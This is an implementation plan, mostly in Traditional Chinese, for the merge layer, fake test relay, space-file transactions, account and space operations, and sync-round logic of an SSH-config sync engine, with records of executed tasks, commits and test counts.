# Sync v2 — B3a(引擎核心:記錄合併、記憶體假 relay、space 檔交易、帳戶與 space 操作、多 space 的一輪)Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 用 B2 的積木做出 Sync v2 引擎的核心 —— 帳戶與 space 的記錄合併(含危險設定的保留待核准)、以 space 為單位的
檔案交易與局部提交、帳戶生命週期、space 操作與核准、spec §7.1 的多 space 一輪(批次查詢、`deferred` 補抓、舊 relay
退回、`5xx` / `429` 退避、凍結偵測)—— 全部經 `SyncEnv` 注入外界,並以記憶體假 relay 做多台裝置的決定性測試。app 在
B3a 期間仍跑 v1 引擎;B3b 把它接上。

**Architecture:** 引擎本體不碰 Tauri。`env::SyncEnv` 帶入 doc / backed_up / retention 的鎖、`runtime::SyncRuntime`、
`~/.ssh`、狀態檔路徑、keychain、relay connector、事件與時鐘;production 由 `AppHandle` 組出(B3b),測試由
`testkit::TestDevice` 組出(暫存家目錄、`MemKeychain`、多台共用的 `FakeRelay` 與 `TestClock`)。`merge` 是純函式的
記錄層;`files` 管 space 檔的準備、讀取與「套用 + 發布」交易;`runtime::{commit, mutate}` 保證每個提交只改自己的
區段、在 core 鎖內比 generation;`account`、`spaces` 是使用者動作;`round` 把它們串成一輪。v1 引擎只有幾個 helper 搬到
`files`,行為不變;每個 task 結束時 app 照常建置、所有測試全綠。

**Tech Stack:** Rust 2021;只用既有相依 —— `serde` / `serde_json`、`reqwest 0.13`(blocking,只經 `RelayClient`)、
`tauri 2`(B3a 不碰)、`thiserror 2`;dev:`tempfile 3`、`ts-rs 10`。

**Spec:** `docs/superpowers/specs/2026-10-02-sync-v2-spaces-design.md`(§4.3、§4.4、§6.4、§7.1–§7.4、§9、§12 #8、
§13 I3/I4)。建立在 B2 執行完的程式碼(到最終修正 `0445ec7` 為止;計畫見 `docs/superpowers/plans/2026-10-02-sync-v2-b2-core.md`,特別是
文末「B3 handoff」,實際與計畫的差異見 Global Constraints)之上;relay 的
語意以 `docs/superpowers/plans/2026-10-02-sync-v2-b1-relay.md` 與 B1 最終審查的裁定(下方 Global Constraints)為準。
續篇:`docs/superpowers/plans/2026-10-02-sync-v2-b3b-engine-wiring.md`(v1 升級、接上 app、更換同步碼、搬移精靈、
B4 handoff)。

## Global Constraints

- 兩個會寫入真實 keychain 的既有測試一律略過:`secrets::tests::round_trip_set_get_delete` 與 `askpass::tests::env_secret_takes_priority_over_keychain`。本計畫寫的「N passed」都是兩個都略過時的數字。
- Rust 註解用繁體中文(沿用 `src-tauri/src/sync/`);識別字、錯誤訊息、UI 字串、commit 訊息用英文;Conventional Commits。
- 只 `git add` 每個 task 列出的路徑(含該 task 由 ts-rs 產生的 `src/bindings/*.ts`);不得 stage `Cargo.lock`、
  `.superpowers/`、`relay/` 或其他無關檔案。
- 每個 task 結束時 `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain` 必須全綠才 commit
  (那兩個既有的測試會讀寫真正的 OS keychain,一律略過;下文的「跑測試」都是這個指令)。測試不連網、不碰真正的 keychain
  與家目錄:引擎一律經 `SyncEnv` 注入外界,測試用 `testkit::TestDevice`(暫存家目錄、`MemKeychain`、共用的 `FakeRelay`
  與 `TestClock`、`RecordingEvents`);載入 config 時 `~` 由 `config::include::with_test_home` 指到暫存家目錄。
- 不新增 crate,`Cargo.toml` 不變。repo 的 `Cargo.lock` 裡 `sshelter` 自己的版本還是 `0.15.1`,第一次 `cargo test`
  會改掉那一行 —— 不屬於 B3,不要 stage,也不要為它另開 commit。
- 鎖:順序固定 lifecycle → doc → backed_up → core;網路 I/O 一律不持有 doc 或 core 鎖;呼叫 `persist_file` 時不持有
  core 鎖(存檔 hook 會拿它);`SyncEvents` 的方法只在放掉所有鎖之後呼叫(production 會同步等待主執行緒重建 tray)。
- 局部提交(spec §7.1 第 6 步、§12 #8):一輪裡的每個提交只改它自己的區段(帳戶、某一個 space、或頂層欄位),在 core 鎖內
  比 generation(`runtime::commit`);絕不以本輪開始時的整份狀態副本覆蓋。生命週期或結構性變更(加入、離開、建立 / 改名 /
  刪除 / 勾選 space、核准、更換同步碼)一律換 generation(`runtime::mutate`;要同時改檔案的動作在 doc → core 鎖內自己換),
  在途輪次的提交因此全部作廢、整輪重跑。
- 祕密(同步碼、權杖、`enc_key`、`spacekey` payload)永不進 log、錯誤訊息、`Debug` 輸出、事件 payload 或狀態檔明文;
  `spacekey` 只以帳戶金鑰加密的 `SealedRecord` 落地,space 的金鑰每次從密文解開。
- ts-rs:匯出型別的 u64 欄位一律 `#[cfg_attr(test, ts(type = "number"))]`(`Option<u64>` 用 `"number | null"`)。
- **B1(relay)最終審查的裁定**(spec §6.2、§6.4、§9、§13 I3/I4),引擎必須照做:
  1. 依焦點輪詢:`relay::next_poll_delay(chains, focused, last_activity_ms, now_ms, consecutive_failures)`(擴充 B2 的同名
     函式,Task 4)—— 視窗在前景或 `ACTIVE_WINDOW`(5 分鐘)內有操作:max(45 秒, 2 秒 × chain 數);否則
     max(`IDLE_POLL_INTERVAL` 5 分鐘, 2 秒 × chain 數)。視窗回到前景、本機修改之後立刻跑一輪(B3b 接上視窗事件與存檔
     hook)。
  2. 批次 `5xx`:一條 chain 的 DO 例外會讓整個 `POST /v1/pull` 回 `5xx`。連續第 2 次批次 `5xx` 起,這一輪改逐條 `GET`
     (壞掉的 chain 不擋住其他 chain),並以連續失敗的輪數指數退避。`429`(整批或 `rate_limited`)一律退避、絕不立刻
     重試 —— 被拒絕的批次照樣扣整批的配額。
  3. push `409 frozen`:立刻停止這一輪的所有上傳、保留 dirty、記下 `frozen`(狀態列「sync code changed」),之後不再上傳、
     不重試;下一輪只讀帳戶 chain 取得更換標記。
  4. 凍結的 chain 被 `DELETE` 之後仍是凍結(`PUT` 回 200、push 仍回 409):`PUT` 成功不代表 chain 可寫,能不能寫以 push
     的結果與更換標記為準;只有未凍結的 chain 刪除後才是全新的(`PUT` 回 201)。`FakeRelay` 照這個語意實作。
  5. 功能偵測:`GET /v1/info` 的 `features`;沒有 `pull-batch` → 逐條查詢(帳戶每輪、space 每 3 輪);沒有 `freeze` →
     「更換同步碼」停用並說明(B3b 的 `rotation::NO_FREEZE_MESSAGE`)。
- B3a 新增的公開項目在 B3b 接上之前只有測試在用:非測試建置的 `dead_code` 警告是預期的,不要加 `#[allow(dead_code)]`
  掩蓋。除此之外不得有新的 warning。
- 數值照抄 spec 或沿用 v1:預設 space「Personal」;上傳每批 ≤ 200 筆且 ≤ 512 KiB;批次查詢每批 ≤ 64 條(`MAX_BATCH_PULL`);
  `429` / `5xx` 退避 90 秒起加倍、最長 15 分鐘;舊 relay 的 space 每 3 輪查一次;裝置心跳 1 小時;連續 3 輪推送衝突就
  不再立刻重跑;space 名稱去頭尾空白後 1–64 字元、不含控制字元、帳戶內不分大小寫不重複;離開帳戶時這台的檔案搬到
  `~/.ssh/sshelter-local/`(目錄 0700、檔案 0600,同名就加 `-2`、`-3` 依序往上)。
- 狀態檔的相容性(B2 審查 M4):狀態檔裡任何一個 enum 讀到不認得的 variant,整份檔案就讀不懂、會被擱到一旁 —— 從 beta
  降回正式版就會丟掉同步狀態。所以 `RotationStep` 等狀態檔裡的 enum 要加 variant 時必須升狀態檔的 `version`;B3 新增的
  `notices` 例外:逐則讀、略過不認得的種類(`state_v2::known_notices`)。
- B2 的實際介面(執行與最終修正之後):`RelayClient::push` 在送出前拒絕空的、超過 200 筆、同一批重複 `id_hash` 的請求,
  單條 `pull` 拒絕超過 2^53 − 1 的 `since`,回應裡超出範圍的序號是 `BadResponse`(引擎絕不送空的 push;`FakeRelay`
  照樣拒絕);`state_v2::save` 拒絕明文的 secret 種類記錄;`back_up_legacy` 只備份 v1 檔;`remove_space_file` 備份失敗就
  不刪;`forbidden_directive` 另外擋下 OpenSSH 讀法不同的 Host/Match 行、看不見的字元、會交給 shell 的值與開頭是 `-` 的
  ProxyJump;`GATED_KEYWORDS` 有 24 個,`LocalForward` / `DynamicForward` 帶綁定位址或 socket 時也要核准。
- **Task 1 實際的介面**(已執行,`103cdeb`、`1e841cf`,審查後的修正):`merge::push_outgoing(relay, chain_id, token, outgoing)`
  回 `Pushed`、不再是 `Result`;`Pushed` 多了 `pub error: Option<RelayError>`,不再 derive `Clone` / `PartialEq`。它在第一個
  失敗的批次停下,之前被接受的照樣保留,所以 `frozen` 也可能和非空的 `accepted` 一起出現。呼叫端一律:先套用 `accepted`
  (`apply_pushed_space` / `apply_pushed_account`)→ 再看 `frozen` → 最後把 `error` 當成以前的 `Err`(限流、relay `5xx`、
  其他錯誤回傳)。另外:`FakeRelay::set_push_quota(Option<u32>)`(前 n 次上傳照常,之後 `413`);回應的筆數對不上 →
  `error = BadResponse`;relay 歷史倒退時,待核准與被拒絕版本的 seq 也歸零,原本乾淨的記錄加進 `republish`;
  `put_space_key` 在 `space_keys.chain_id != space_id` 時回錯誤。`sync::merge` 26 個測試、`sync::state_v2` 13 個。
- **Task 2–3 實際的介面**(已執行,`22d49cc`、`7d892e6`、`8723d80`、`bbb7f97`,審查後的修正;Task 4 依此):
  - `files::write_include` 寫檔失敗時把主 config 的 in-memory 項目退回原樣。`files::prepare_files` 改寫 Include 碰到
    `Conflict`(主 config 在載入之後被外部改過)時重載 doc(重載也失敗就丟掉 doc、回 `AppError::Other`),放掉所有鎖之後
    **自己**發 `applied(0)` 再回 Err —— 呼叫端不再發,並把 `Conflict` 當成「馬上重跑」(`wake`)而不是狀態列的錯誤。
    `prepare_files` 可能先換了 generation(重新長出不見的檔案、做完取消勾選)才失敗,那個錯誤也要記下(Task 2 審查 M8)。
    勾選的 space 檔不在時以 `create_new` 建空檔(不蓋掉剛出現的檔案);Include 那一行改了也重載 doc。
  - `spaces::reconcile_space_files` 回任何 Err:呼叫端放掉 doc / backed_up / core 之後發 `applied(0)`(`Conflict`,或已經動過
    檔案時,它已在原地重載 doc);`Conflict` = 「馬上重跑」。
  - `spaces::approve(env, space_id, approvals: &[(String, u64)]) -> Result<Reviewed, AppError>`、
    `spaces::reject(env, space_id, rejections: &[(String, u64)]) -> Result<Reviewed, AppError>`,
    `pub struct Reviewed { pub applied: usize, pub changed: Vec<String> }`:`u64` 是使用者看過的待核准記錄的 seq;待核准的
    已經換成別的版本(或已處理、已不在清單上)就略過、列在 `changed`,較新的版本留在清單上。空清單或全部過時 = no-op(不換
    generation、不發事件);清單不是空的就要 `account_ready`。
  - `rename_space` / `delete_space`:帳戶記錄存檔之後,檔案那一半碰到 `Conflict` 時回 Ok 並 `wake()`(下一輪做完)。
    `leave_account` 在更換同步碼過了可以取消的階段時拒絕(「a sync code change is in progress; let it finish (it resumes on
    its own) before this computer leaves」);刪除帳戶也刪掉 `chain_deletes` 裡排隊的 chain;`rebuild_space` 照 relay 歷史倒退
    記帳(`republish`、待核准與拒絕的 seq 歸零)。
  - Task 4 開始時(兩個 keychain 測試都略過)`586 passed`:`sync::files` 23、`sync::runtime` 3、`config::include` 6、
    `sync::account` 15、`sync::spaces` 16、`sync::space_files` 11、`sync::hosts_file` 22、`sync::merge` 26。
- **Task 4 實際的介面**(已執行,`389e8dc`、`80caddf`,審查後的修正;B3b 依此):
  - `round::RoundOutcome { frozen: bool, markers: Vec<RotationMarkerPayload>, backoff: bool }`(`Debug`、`Default`、
    `PartialEq`)。`frozen` = 上傳撞到 `409 frozen`;`markers` = 拉帳戶時看到的更換標記 —— 這一輪在套用、上傳任何東西之前
    就停了,`mark_frozen_chains` 時才記進狀態(`false` 時只回報);`backoff` = 這一輪以被限流或 relay 出錯收尾(拿不到帳戶的
    那一輪也算),呼叫端不要立刻重跑,等 `next_delay`。
  - 只屬於某條 space chain 的上傳錯誤(`QuotaExceeded`、`InvalidRequest`、`BadResponse`)記成那個 space 的 `last_error`(帶
    space 名稱,例如「space "Work" is over the relay's storage limit: remove hosts or large blocks from it」),其他 space 照常
    上傳;儲存額度滿了算這一輪失敗(退避)。帳戶的上傳錯誤、連不上 relay 照舊結束這一輪。
  - 任何 `429` 之後這一輪不再對 relay 發請求;拿不到帳戶的那一輪不更新 `last_sync_ms`;舊版 relay 上有 dirty 記錄的 space
    每一輪都拉;第 3 步只有本機 diff 真的改了什麼才存檔;`next_poll_delay` 不理會比現在晚超過一個 `ACTIVE_WINDOW` 的
    操作時間。
  - B3a 結束時(兩個 keychain 測試都略過)`624 passed`:`sync::round` 38、`sync::relay` 26。
- **最終修正**(已執行,`b85c2d2`、`28275ae`、`d407a9c`、`3e1c474`、`990cd61`;報告在
  `.superpowers/sdd/2026-10-02-sync-v2-b3a-engine-core/final-fix-report.md`):
  - `spaces::approve` / `spaces::reject` 收 `&[(String, u64, u64)]` = (alias, seq, version):relay 歷史倒退或重建之後,同一個
    seq 可能是另一個版本,只有呼叫端知道對話框顯示的是哪一版。待核准或被拒絕的同一個版本再被拉到時不再重問。
  - `leave_account(delete_remote = true)` 在同步碼已被別台更換(`frozen`,或刪到一半才記下)時不刪 relay 上的任何東西、只在
    這台離開,回 `Err(LEAVE_REPLACED_MESSAGE)`;結構性的命令在提交的那段 core 臨界區裡再檢查一次 `account_ready`。
  - `create_account` / `join_account` 先把 v1 留下的 `~/.ssh/sshelter/hosts.config` 搬到 `~/.ssh/sshelter-local/`(同離開時的
    `keep_files_local`)並留下 `left_account` 提示;v1 升級還沒完成時建立 / 加入照舊被拒絕(檔案歸升級處理)。
  - 每個以退避收尾的一輪都把 `failed_rounds` 加一、把限流 / relay 出錯寫進 `last_error`(含看到標記、`Conflict`、改了檔案、
    `frozen_out` 的出口);`/v1/info` 回 `429` 時這一輪在拉取之前就以退避結束;`note_activity` 直接存新的時間(不取最大值)。
  - 只在 B3a 內部:`hosts_file::release_include(items, kept, exists)`、`spaces::reconcile_space_files` 回
    `Result<Reconciled, ReconcileError { error, notices }>`、新增 `account::record_relay_info`、`create_empty_space_file` 搬到
    `space_files`(pub);`round::tests::shown` 回 `(alias, seq, version)`。B3b 不呼叫它們。
  - B3a 結束時(兩個 keychain 測試都略過)`650 passed`:`sync::account` 18、`sync::spaces` 22、`sync::round` 49、
    `sync::merge` 27、`sync::files` 25、`sync::space_files` 12、`sync::hosts_file` 23、`sync::runtime` 4。
- **最終修正的補充**(已執行,`5c98f25`;同一份報告的 Addendum):核准 / 拒絕改以內容認 ——
  `spaces::review_digest(&PendingApproval) -> String`(公開;版本號、時間戳、device_id 與內容的 SHA-256,用到時才算),
  `spaces::approve` / `reject` 收 `&[(String, String)]` = (alias, digest),取代上一條的 (alias, seq, version)(序號在 relay
  歷史倒退之後會重發,版本號兩台可能寫出同一個)。v1 留下的 `hosts.config` 只有在主 config 有效的 Include(含 glob)讀它時才
  搬走並提示;離開時只被 glob 列到的檔案,在 glob 的位置放上新路徑,照樣讀得到;`refresh_markers` 碰到 `429` / `5xx` 也退避。
  B3a 結束時(兩個 keychain 測試都略過)`657 passed`(`sync::account` 20、`sync::hosts_file` 24、`sync::round` 52、
  `sync::spaces` 23)。
- 基準:四個 task 與最終修正都已在 repo 執行(HEAD `5c98f25`);B3b 以這一版為基準。

## Review Focus

1. **同一個 space 一台刪除、另一台同時改名**:改名的 `space` 記錄較新、刪除的是 `spacekey` tombstone(或反過來)——
   不論 LWW 哪一筆贏,每台最後都是「已刪除」:檔案先移出 Include 再備份刪除,不會留下孤兒檔或只有名字的 space
   (Task 1 `a_space_is_deleted_when_either_of_its_records_is_a_tombstone`、Task 4
   `a_delete_racing_a_rename_wins_everywhere`)。
2. **space 檔被外部工具清空或刪掉**:從 chain 重新長出、保留還沒上傳的修改,絕不把「檔案空了」當成「刪除每一台主機」
   推上去;其他 space 不受影響(Task 2 `a_vanished_space_file_is_restored_from_the_chain_and_the_other_spaces_are_untouched`、
   Task 4 `an_emptied_space_file_is_restored_from_the_chain_instead_of_deleting_every_host`、
   `a_vanished_space_file_comes_back_from_the_chain_with_unpushed_edits`)。
3. **一條壞掉的 chain 或一個壞掉的 space 檔**:relay 的一條 chain 一直 `500`、某個 space 檔有 wildcard 或重複的
   alias —— 只有那個 space 暫停,其他 space 照常提交與上傳;批次第二次 `5xx` 改逐條查詢(Task 4
   `one_broken_chain_fails_the_batch_and_the_second_failure_falls_back_to_single_pulls`、
   `a_broken_space_chain_cannot_block_the_others`、`each_space_commits_on_its_own_and_a_broken_space_pauses_alone`)。
4. **本機修改與等待核准 / 已拒絕的遠端版本交錯**:較新的危險版本被保留時,這台較舊、未上傳的修改不再上傳並發
   `sync://conflict`;拒絕之後這台再改,新版本以被拒絕的版本為基準、照 LWW 勝出,推送不會一直撞衝突(Task 1
   `a_held_change_beats_an_older_unpushed_local_edit`、`a_pending_or_declined_remote_version_is_the_base_for_the_next_local_edit`、
   Task 3 `approving_applies_the_held_block_and_rejecting_keeps_the_local_one`)。
5. **離開帳戶之後換 relay(建立或加入另一個帳戶)**:舊帳戶的 space 檔必須仍是 ssh 讀得到、app 載得到(搬移精靈看得到)
   的一般本機檔案,之後的 `ensure_include` 不能把它們移出 Include;搬不過去時什麼都不改、可以重試(Task 3
   `leaving_keeps_the_space_files_as_local_files_that_ssh_still_reads`、`a_failed_move_changes_nothing_and_leaving_can_be_retried`、
   `abandoning_the_upgrade_keeps_the_v1_hosts_as_a_local_file`、`leaving_keeps_files_as_plain_local_files_without_overwriting_any`、
   `a_failed_include_update_removes_the_new_paths_and_changes_nothing`、
   `released_tokens_become_plain_includes_that_ensure_include_leaves_alone`)。

## 對 spec 的解讀(實作時的決定)

1. **加入與勾選**(§7.3「讓使用者勾選 space」、§8「加入後勾選 space」):`join_account` 只加入、不勾選任何 space;使用者
   接著逐一勾選(`spaces::select_space`),每個勾選的 space 以基線輪開始。
2. **刪除帳戶**(§7.3):`leave_account(env, delete_remote = true)` 先 `DELETE` 每個 space chain 與帳戶 chain(`404` 視為
   已刪除),任何一個失敗就什麼都不改、回錯誤;「是不是最後一台」由 UI 依裝置清單判斷,後端不擋(清單可能過時)。
3. **刪除 space 的順序**(§7.2「tombstone → `DELETE` chain」):chain 的 `DELETE` 排到 tombstone 上傳成功之後
   (`AccountState.chain_deletes`,存的是 tombstone 之前那份 `spacekey` 密文)—— 別台一定先看到 tombstone,不會先撞到
   「chain 不見了」。`space` 或 `spacekey` 任一筆是 tombstone 就算刪除,所以刪除一定贏過同時的改名。
4. **拒絕之後的本機修改**(§7.4「之後若本機修改這台主機,新的本機版本照 LWW 推送」):被拒絕的遠端版本記在
   `SpaceState.declined`(只有版本號、時間戳、seq,不存內容),下一個本機版本以它(與等待核准的版本)為基準,保證
   LWW 勝出、`base_seq` 也對得上;收到同一 alias 更新的遠端版本就清掉。
5. **等待核准的較新版本 vs. 這台未上傳的舊修改**:LWW 照常 —— 較新的遠端版本勝出(保留待核准,不套用),本機修改不再
   上傳並發 `sync://conflict`;核准前檔案維持原狀。
6. **基線輪的合併審核**(§7.4):不另開流程 —— 一輪裡新保留的主機以一次 `sync://approval`(每個 space 一項)發出;
   `spaces::approve(env, space_id, approvals)` 一次核准多台,「全部核准」就是傳入整個清單(Task 3 審查後:`approvals` 是
   使用者看過的 `(alias, seq)`,只套用清單上仍是那一版的)。
7. **space chain `404`、帳戶仍有它**(§9):`SpaceState.missing` 讓該 space 暫停(不查、不寫);「用本機內容重建」=
   `spaces::rebuild_space`(以同一組位置與權杖 `PUT`,快取記錄全部標 dirty 重傳);「移除」= `spaces::delete_space`。
   帳戶已 tombstone 它時照 §4.3 移除檔案並留下 `SpaceDeleted` 提示。
8. **輪詢的「幾分鐘」**(§6.4 與 B1 裁定):`ACTIVE_WINDOW` = 5 分鐘(app 存檔、Sync 命令、視窗回到前景都算操作);閒置
   間隔 5 分鐘;`429` 與 `5xx` 共用一個「連續失敗輪數」計數(`SyncCore.failed_rounds`)做指數退避,批次 `5xx` 另有
   `SyncCore.batch_failures` 決定何時改逐條查詢。
9. **push `409 frozen` 但還沒有標記**(§6.4):記下沒有標記的 `frozen`(UI 顯示「sync code changed」),不再上傳;之後
   每輪只讀帳戶 chain,讀到標記就補上是誰更換的。
10. **提示**(§7.2「Work 已在 MacBook-A 刪除」、§4.3 改名被擋、§7.3 離開後的檔案、§8 升級說明):存成
    `SyncStateV2.notices`,看過才清掉(B3b 的 `sync_dismiss_notice`),同時以 `SyncEvents::notice` 發出。
11. **離開之後的檔案**(§7.3「本機 space 檔案與 Include 保留,ssh 照常可用;它們之後就是一般的本機檔案」、「要換 relay:
    離開 → 改 URL → 建立新帳戶,再用搬移精靈搬進新帳戶的 space」):`ensure_include` 把 `~/.ssh/sshelter/` 底下所有
    token 當成我們的,原地保留的話,下一次建立或加入帳戶就會把它們移出 Include。所以離開時把這台勾選的 space 檔(放棄
    v1 升級時是 `hosts.config`)搬到 `~/.ssh/sshelter-local/`(同檔名;已有同名檔就加 `-2`、`-3` 依序往上,絕不覆蓋),主
    config 裡我們的 token 原地換成新路徑 —— 一般的 Include,優先順序不變。順序同改名:先建新路徑(hard link,不支援就
    複製)→ 換 Include → 刪舊路徑,主 config 從不指向不存在的檔案。建新路徑或寫主 config 失敗 → 移除已建的新路徑,
    離開失敗、什麼都沒變(可以重試);成功時留下 `SyncNotice::LeftAccount { kept_files }`。
12. **改名被擋的提示只出現一次**:每一輪都會重試改名;`SpaceState.rename_blocked` 記下被擋的目標檔名,同一個目標仍被擋時
    不再提示(使用者關掉之後不會再冒出來),目標換了才再提示一次;改名成功或不再需要改名就清掉。這個記號由帳戶那一步
    維護,發布 space 的合併結果時保留(`files::apply_and_commit_space`)。
13. **v1 helper 的去處**:`check_managed_items`、`apply_effects_to_items`、`EngineWrite`、`engine_writing`、
    `memory_matches_disk`、`items_match_disk` 從 `engine.rs` 搬到 `files.rs`(兩版共用),v1 引擎改用它們,行為不變。

## 檔案結構

| 檔案 | 動作 | 責任 |
|---|---|---|
| `src-tauri/src/sync/merge.rs` | 新增(Task 1) | 純函式記錄層:space 的本機 diff、LWW 合併、核准保留、帳戶記錄分流(明文 / 密文)、更換標記、上傳分批 |
| `src-tauri/src/sync/fake_relay.rs` | 新增(Task 1,只在測試) | 記憶體假 relay,實作 `RelayApi`;可注入舊版 relay、離線、預算、限流、`5xx`、壞掉的 chain |
| `src-tauri/src/sync/state_v2.rs` | 修改(Task 1) | `notices`、`chain_deletes`、`declined`、`republish`、`missing`、`rename_blocked`、`DeclinedVersion`、`SyncNotice` |
| `src-tauri/src/sync/runtime.rs` | 新增(Task 2) | `SyncCore` / `SyncRuntime`、`commit`(局部提交)、`mutate`(結構變更)、`save_core` |
| `src-tauri/src/sync/env.rs` | 新增(Task 2) | `SyncEnv` 與 `Keychain` / `RelayConnector` / `SyncEvents` / `Clock` 邊界及 production 實作 |
| `src-tauri/src/sync/files.rs` | 新增(Task 2;Task 4 改一段註解) | space 檔的準備(重新長出、半途的取消勾選、Include 清單)、讀取與不變式、「套用 + 發布」交易、存檔 hook |
| `src-tauri/src/sync/dto.rs` | 新增(Task 2) | 事件 payload `SyncConflict`、`ApprovalNotice`(B3b 加上狀態 DTO) |
| `src-tauri/src/sync/testkit.rs` | 新增(Task 2,只在測試;Task 4 小改) | `TestDevice`、`TestClock`、`MemKeychain`、`RecordingEvents`、`FakeConnector`、`AppliedProbe`(Task 4 從 `files` / `spaces` 的測試搬來) |
| `src-tauri/src/config/include.rs` | 修改(Task 2) | 測試建置的 `with_test_home`:載入 config 時 `~` 指向暫存家目錄 |
| `src-tauri/src/sync/engine.rs` | 修改(Task 2) | v1 引擎改用 `files` 的 helper(行為不變) |
| `src-tauri/src/sync/account.rs` | 新增(Task 3) | 建立 / 加入 / 離開(含刪除帳戶)、relay URL、`GET /v1/info`、裝置名稱、Forget、顯示同步碼 |
| `src-tauri/src/sync/spaces.rs` | 新增(Task 3;Task 4 的測試改用 testkit 的 `AppliedProbe`) | 建立 / 改名 / 刪除 / 勾選 / 取消勾選 / 重建 space、核准 / 拒絕、`reconcile_space_files` |
| `src-tauri/src/sync/space_files.rs` | 修改(Task 3) | 離開時把檔案改成本機檔案:`LOCAL_INCLUDE_DIR`、`local_dir`、`KeptFile`、`keep_files_local` |
| `src-tauri/src/sync/hosts_file.rs` | 修改(Task 3) | `release_include`:主 config 裡我們的 token 原地換成本機路徑 |
| `src-tauri/src/sync/round.rs` | 新增(Task 4) | 一輪同步(spec §7.1)、批次查詢與退回、退避、凍結偵測、`next_delay` |
| `src-tauri/src/sync/relay.rs` | 修改(Task 4) | `next_poll_delay` 加上焦點與最近操作(B1 裁定) |
| `src-tauri/src/sync/mod.rs` | 修改(每個 task) | 註冊新模組 |
| `src/bindings/SyncNotice.ts`、`SyncConflict.ts`、`ApprovalNotice.ts` | 新增(Task 1、2,ts-rs 產生) | 事件 payload |

Task 依序執行:Task 2 用到 Task 1 的 `merge` 與 `FakeRelay`;Task 3 用到 Task 2 的 `SyncEnv`、`runtime`、`files`、
`testkit`;Task 4 用到前三個 task 的全部。

四個 task 都已在 repo 執行(Task 1 `103cdeb`、`1e841cf`;Task 2 `22d49cc`、`7d892e6`;Task 3 `8723d80`、`bbb7f97`;
Task 4 `389e8dc`、`80caddf`;最終修正 `b85c2d2`…`990cd61`、`5c98f25`),之後(兩個 keychain 測試都略過)是 `657 passed`。下面各 task
保留原本的步驟作為紀錄。

---

### Task 1: 記錄層 `merge`、記憶體假 relay、v2 狀態的新欄位

> **已執行**(repo `103cdeb`、`1e841cf`,含審查後的修正)。下面保留原本的步驟作為紀錄,不要再執行;實際的程式碼以 repo 為準,審查後與本節不同的介面見 Global Constraints 的「Task 1 實際的介面」。執行後(兩個 keychain 測試都略過)是 `531 passed`,`sync::merge` 26 個、`sync::state_v2` 13 個;下面 Step 裡的數字是原本計畫的。

spec §7.1 第 3–4、7 步與 §7.4 的記錄層,全部是純函式(網路只在 `push_outgoing`,經 `RelayApi`)。規則沿用 v1
`reconcile`:記錄層級 LWW、cursor 只跟 pull 的 watermark、解不開或格式不對的遠端記錄略過且不進快取、watermark 倒退就
整份重傳。v2 多出來的:帳戶記錄依 `RecordKind::is_secret` 分流到明文 `records` 與密文 `sealed`;帳戶 chain 上的
`rotation:*` 標記;遠端 `Upsert` 若需要核准(B2 `approval::needs_approval`)就保留在 `pending_approvals`、不套用也不進
快取。`FakeRelay` 照 relay Worker 的語意實作 `RelayApi`(含 B1 裁定:凍結的 chain 刪除後仍凍結、一條壞掉的 chain 讓
整批 `500`),之後每個引擎測試都靠它重現多台裝置。

**Files:**
- Create: `src-tauri/src/sync/merge.rs`
- Create: `src-tauri/src/sync/fake_relay.rs`(`#[cfg(test)]`)
- Modify: `src-tauri/src/sync/state_v2.rs`(`SyncStateV2`、`AccountState`、`SpaceState` 的新欄位;`DeclinedVersion`、`SyncNotice`)
- Modify: `src-tauri/src/sync/mod.rs`
- Generated: `src/bindings/SyncNotice.ts`(ts-rs,`cargo test` 產生)

**Interfaces:**
- Consumes(B2):`crypto::{ChainKeys, id_hash, is_chain_id}`;`record::{Record, RecordKind, LocalRecord, Envelope, merge,
  MergeOutcome, record_key, rotation_marker_device, DevicePayload, HostPayload, MetaPayload, SpacePayload, SpaceKeyPayload,
  RotationMarkerPayload, ACCOUNT_META_ID, SCHEMA_VERSION}`;`reconcile::{encode, decode, HostEffect}`;
  `planner::{detect_local_changes, next_timestamp}`;`hosts_file::{HostBlockText, validate_host_text, is_syncable_alias}`;
  `approval::{needs_approval, signature}`;`relay::{RelayApi, RelayError, RelayInfo, PullResponse, PushItem, PushOutcome,
  PushResult, BatchPullItem, BatchPullEntry, BatchPullResult, FEATURE_PULL_BATCH, FEATURE_FREEZE, MAX_BATCH_PULL}`;
  `space_files::include_tokens`;`state_v2::{AccountState, SpaceState, SealedRecord, PendingApproval, sealed_key}`。
- Produces(`state_v2`,欄位全部 `#[serde(default)]`,舊狀態檔照樣讀得回來):
  - `SyncStateV2.notices: Vec<SyncNotice>`;`AccountState.chain_deletes: Vec<SealedRecord>`;
    `SpaceState.declined: BTreeMap<String, DeclinedVersion>`、`SpaceState.republish: BTreeSet<String>`、`SpaceState.missing: bool`、
    `SpaceState.rename_blocked: Option<String>`(被擋下的改名目標檔名)
  - `notices` 以 `#[serde(default, deserialize_with = "known_notices")]` 讀:逐則讀,不認得的種類略過(降版安全)
  - `pub struct DeclinedVersion { pub version: u64, pub updated_at_ms: u64, pub seq: u64 }`
  - `pub enum SyncNotice { Upgraded { kept_file: Option<String>, kept_hosts: Vec<String> }, SpaceDeleted { name: String, by_device: String }, RenameBlocked { space_id: String, name: String, file_name: String }, LeftAccount { kept_files: Vec<String> }, NewSyncCode, OtherRotation { devices: Vec<String> } }`(`#[serde(tag = "kind", rename_all = "snake_case")]`,ts-rs 匯出)
- Produces(`merge`):
  - `pub fn plan_hosts(space: &mut SpaceState, blocks: &[HostBlockText], device_id: &str, changed_at: impl Fn(&str) -> u64) -> usize`
  - `pub struct SpaceMerged { pub section: SpaceState, pub effects: Vec<HostEffect>, pub conflicts: Vec<String>, pub held: Vec<String>, pub skipped: u32 }`
  - `pub fn merge_space(section: &SpaceState, keys: &ChainKeys, pulled: &PullResponse, applied: &[HostBlockText], device_name: impl Fn(&str) -> String) -> SpaceMerged`
  - `pub fn unpushed_host_effects(section: &SpaceState, blocks: &[HostBlockText]) -> Vec<HostEffect>`
  - `pub struct SpaceEntry { pub id: String, pub name: String, pub slug: String, pub created_at_ms: u64, pub previous_id: Option<String>, pub deleted: bool, pub updated_by: String }`
  - `pub fn space_entries(account: &AccountState) -> Vec<SpaceEntry>`;`pub fn space_entry(account: &AccountState, space_id: &str) -> Option<SpaceEntry>`
